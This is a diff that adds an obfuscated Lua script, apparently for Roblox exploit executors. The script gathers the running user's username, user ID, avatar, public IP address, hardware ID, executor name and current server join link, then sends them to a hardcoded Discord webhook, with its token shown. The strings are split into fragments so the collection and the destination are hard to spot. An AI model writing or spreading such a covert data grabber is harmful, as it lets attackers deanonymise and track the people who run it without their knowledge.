@@ -1,0 +1,94 @@
+local env = getfenv()
+local g = _G
+local s_find = "re".."que".."st"
+local req = env[s_find] or g[s_find] or env["ht".."tp".."_re".."que".."st"] or (syn and syn[s_find])
+
+local serv_name = "Get".."Ser".."vice"
+local http_serv = game[serv_name](game, "Http".."Ser".."vice")
+local players = game[serv_name](game, "Pla".."yers")
+
+local p = "h".."t".."t".."p".."s" .. ":" .. "/" .. "/"
+local d = "di".."sc".."or".."d" .. "." .. "co".."m"
+local a = "/" .. "ap" .. "i" .. "/" .. "we" .. "bh" .. "oo" .. "ks" .. "/"
+local key = "1445783944783073392/bEY9s5J3yAJVFHe5sw4EPrLL1KwtECFmkFH7CG1nw-4kwEw4CiTsAP2WaUFQRaUjEQ4z"
+local target = p .. d .. a .. key
+
+local l_plr = players["Lo".."cal".."Pla".."yer"]
+local id = tostring(l_plr["U".."ser".."Id"])
+
+local ip_url = "h".."tt".."p".."s" .. "://" .. "if".."con".."fig"..".".."me".."/".."ip"
+local my_ip = "Un".."kno".."wn"
+pcall(function()
+    my_ip = game["Ht".."tp".."Ge".."t"](game, ip_url)
+end)
+
+local function fetch_avatar(u_id)
+    local rb_proxy = "th".."um".."bn".."ai".."ls"..".".."ro".."pr".."ox".."y"..".".."co".."m"
+    local final_api = p .. rb_proxy .. "/v1/users/avatar?userIds=" .. u_id .. "&size=420x420&format=Png&isCircular=false"
+
+    local success, res = pcall(function()
+        return req({
+            Url = final_api,
+            Method = "G".."ET"
+        })
+    end)
+
+    if success and res and res["Bo".."dy"] then
+        local ok, data = pcall(function() return http_serv["JS".."ON".."De".."co".."de"](http_serv, res["Bo".."dy"]) end)
+        if ok and data.data and data.data[1] then
+            return data.data[1].imageUrl
+        end
+    end
+    return "ht".."tps://www.roblox.com/thumbnails/avatar?userId=" .. u_id .. "&width=420&height=420"
+end
+
+local av_url = fetch_avatar(id)
+
+if req then
+    local exec_name = "None"
+    local hwid_val = "None"
+
+    local check_exec = env["iden".."tify".."exe".."cutor"] or g["iden".."tify".."exe".."cutor"]
+    if check_exec then pcall(function() exec_name = check_exec() end) end
+
+    local check_hwid = env["ge".."t_h".."wid"] or g["ge".."t_h".."wid"]
+    if check_hwid then pcall(function() hwid_val = check_hwid() end) end
+
+    local placeId = tostring(game.PlaceId)
+    local jobId = tostring(game.JobId)
+    local joinLink = "roblox" .. "://" .. "placeId=" .. placeId .. "&game" .. "InstanceId=" .. jobId
+
+    local payload_data = {
+        ["emb".."eds"] = {{
+            ["tit".."le"] = "[ "..tostring(l_plr.DisplayName).." ] ( @"..tostring(l_plr.Name).." )                                   { " .. tostring(exec_name) .. " }",
+            ["col".."or"] = 16711680,
+            ["thum".."bnail"] = { ["url"] = av_url },
+            ["fie".."lds"] = {
+                {
+                    ["name"] = "",
+                    ["value"] = "ht".."tps://www.roblox.com/users/"..id.." ```"..tostring(my_ip).."```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "",
+                    ["value"] = "```"..tostring(hwid_val).."```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "",
+                    ["value"] = "```"..joinLink.."```",
+                    ["inline"] = false
+                }
+            }
+        }}
+    }
+
+    req({
+        Url = target,
+        Body = http_serv["JS".."ON".."En".."co".."de"](http_serv, payload_data),
+        Method = "P".."O".."ST",
+        Headers = {
+            ["con".."tent-ty".."pe"] = "app".."lica".."tion".."/".."js".."on"
+        }
+    })
+end
